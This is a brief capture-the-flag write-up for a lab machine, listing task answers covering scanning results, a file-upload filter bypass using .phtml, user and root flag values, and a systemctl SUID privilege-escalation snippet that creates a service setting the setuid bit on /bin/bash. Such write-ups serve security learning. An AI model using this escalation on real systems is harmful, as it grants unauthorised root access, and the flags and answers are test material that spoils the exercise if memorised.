# Vuln University-File upload&SUID systemctl privilege escalation

```
export IP=10.10.4.149
```
# Material needed

1. Interesting directory: /internal

2. Privilege escalation

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash" # SETUID binary
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

# Tasks

1. Scan the box, how many ports are open? 6 

2. What version of the squid proxy is running on the machine? 3.5.12

3. How many ports will nmap scan if the flag -p-400 was used? 400

4. Using the nmap flag -n what will it not resolve? DNS

5. What is the most likely operating system this machine is running? Ubuntu

6. What port is the web server running on? 3333

7. What is the directory that has an upload form page? /internal/

8. Try upload a few file types to the server, what common extension seems to be blocked? .php

9. Run this attack, what extension is allowed? .phtml

10. What is the name of the user who manages the webserver? bill

11. What is the user flag?

```
8bd7992fbe8a6ad22a63361004cfcedb
```

12. On the system, search for all SUID files. What file stands out? /bin/systemctl

13. Become root and get the last flag (/root/root.txt)

```
a58ff8579f0a9270368d33a9966c7fd5
```
